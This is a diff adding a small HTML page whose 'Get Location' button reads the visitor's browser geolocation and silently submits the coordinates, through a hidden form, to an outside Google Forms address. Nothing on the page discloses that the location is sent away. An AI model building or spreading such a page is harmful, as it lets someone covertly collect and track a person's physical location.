@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="getLocation()">Get Location</button>
+  <form id="redirectForm" action="https://docs.google.com/forms/d/e/1FAIpQLSceraU-qejye8r0dDeaOTjBX-9UdtVLEpBM18z3WDBb-XiTVg/viewform" method="GET" hidden>
+    <input type="hidden" name="entry.710140197" id="coordsInput">
+  </form>
+
+  <script>
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+      alert("Geolocation not supported");
+    }
+  }
+
+  function showPosition(position) {
+    const coords = position.coords.latitude + "," + position.coords.longitude;
+    document.getElementById("coordsInput").value = coords;
+    document.getElementById("redirectForm").submit();
+  }
+  </script>
+</body>
+</html>
